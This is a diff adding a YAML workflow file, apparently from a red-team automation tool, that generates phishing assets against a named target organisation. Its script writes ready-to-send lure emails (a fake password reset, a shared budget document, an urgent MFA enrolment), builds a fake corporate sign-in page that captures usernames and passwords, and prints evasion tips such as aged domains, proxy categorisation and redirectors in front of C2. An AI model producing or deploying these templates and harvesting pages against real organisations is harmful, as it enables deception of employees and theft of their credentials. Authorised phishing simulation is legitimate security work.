@@ -1,0 +1,129 @@
+name: phishing-infra
+description: |
+  Phishing infrastructure preparation — generate email templates,
+  configure GoPhish campaigns, build credential harvesting pages,
+  and prepare evasion techniques.
+tags: [redteam, phishing, social-engineering]
+dispatch:
+  inputs:
+    domain:
+      required: true
+      type: string
+      description: Phishing domain
+    target_org:
+      required: true
+      type: string
+      description: Target organization name
+    lhost:
+      type: string
+      default: ''
+      description: Listener/callback IP
+
+jobs:
+  generate:
+    name: Generate Phishing Assets
+    steps:
+    - name: gen-templates
+      script: |
+        import base64
+        from pathlib import Path
+
+        domain = '{{ inputs.domain }}'
+        org = '{{ inputs.target_org }}'
+        lhost = '{{ inputs.lhost }}' or domain
+
+        print(f"=== PHISHING INFRA: {domain} ===\n")
+
+        # Email templates
+        templates = {}
+
+        templates['password_reset'] = f"""Subject: [Action Required] Password Reset for {org}
+
+        <html>
+        <body style="font-family: Arial, sans-serif;">
+        <div style="max-width: 600px; margin: 0 auto; padding: 20px;">
+          <img src="https://{domain}/logo.png" alt="{org}" style="height:40px;">
+          <h2>Password Reset Required</h2>
+          <p>Dear User,</p>
+          <p>Your {org} account password has expired. Please click the button below to reset your password within 24 hours to avoid account lockout.</p>
+          <a href="https://{domain}/reset?id={{{{.RId}}}}" style="background-color:#0066cc;color:white;padding:12px 24px;text-decoration:none;border-radius:4px;display:inline-block;">Reset Password</a>
+          <p style="color:#666;font-size:12px;margin-top:20px;">If you did not request this change, please contact IT support.</p>
+          <p>IT Security Team<br>{org}</p>
+        </div>
+        </body>
+        </html>"""
+
+        templates['shared_doc'] = f"""Subject: Document Shared: Q4 Budget Report
+
+        <html>
+        <body style="font-family: Arial, sans-serif;">
+        <div style="max-width: 600px; margin: 0 auto; padding: 20px;">
+          <div style="background:#f5f5f5;padding:20px;border-radius:8px;">
+            <h3>📄 Document Shared With You</h3>
+            <p><strong>From:</strong> Management Team</p>
+            <p><strong>Document:</strong> Q4_Budget_Report_2024.xlsx</p>
+            <a href="https://{domain}/view?id={{{{.RId}}}}" style="background-color:#0078d4;color:white;padding:10px 20px;text-decoration:none;border-radius:4px;">Open Document</a>
+          </div>
+          <p style="color:#999;font-size:11px;">Shared via {org} Document Portal</p>
+        </div>
+        </body>
+        </html>"""
+
+        templates['mfa_setup'] = f"""Subject: [Urgent] Enable Multi-Factor Authentication
+
+        <html>
+        <body style="font-family: Arial, sans-serif;">
+        <div style="max-width: 600px; margin: 0 auto; padding: 20px;">
+          <h2>⚠️ MFA Enrollment Required</h2>
+          <p>As part of {org}'s new security policy, all employees must enable MFA by end of business today.</p>
+          <p>Failure to comply may result in temporary account suspension.</p>
+          <a href="https://{domain}/mfa?id={{{{.RId}}}}" style="background-color:#d9534f;color:white;padding:12px 24px;text-decoration:none;border-radius:4px;">Set Up MFA Now</a>
+          <p>Information Security<br>{org}</p>
+        </div>
+        </body>
+        </html>"""
+
+        # Landing page
+        landing_page = f"""<!DOCTYPE html>
+        <html>
+        <head><title>{org} - Sign In</title>
+        <style>
+        body {{ font-family: 'Segoe UI', Arial; background: #f0f2f5; }}
+        .login-box {{ max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
+        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
+        button {{ width: 100%; padding: 12px; background: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
+        </style></head>
+        <body>
+        <div class="login-box">
+          <h2>{org}</h2>
+          <p>Sign in with your organizational account</p>
+          <form method="POST" action="/login">
+            <input type="email" name="username" placeholder="Email address" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Sign In</button>
+          </form>
+        </div>
+        </body></html>"""
+
+        out_dir = Path('/tmp/ofx_phishing')
+        out_dir.mkdir(exist_ok=True)
+
+        for name, content in templates.items():
+            (out_dir / f"{name}.html").write_text(content)
+            print(f"  [+] Template: {name}.html")
+
+        (out_dir / "landing.html").write_text(landing_page)
+        print(f"  [+] Landing page: landing.html")
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"output_dir={out_dir}\n")
+            f.write(f"template_count={len(templates)}\n")
+
+        print(f"\n  Output directory: {out_dir}")
+        print(f"\n--- OPSEC Reminders ---")
+        print(f"  1. Use aged domain (>30 days)")
+        print(f"  2. Configure SPF/DKIM/DMARC")
+        print(f"  3. Use HTTPS with valid cert")
+        print(f"  4. Categorize domain in web proxies")
+        print(f"  5. Use redirector in front of C2/phishing server")
+      log-stdout: true
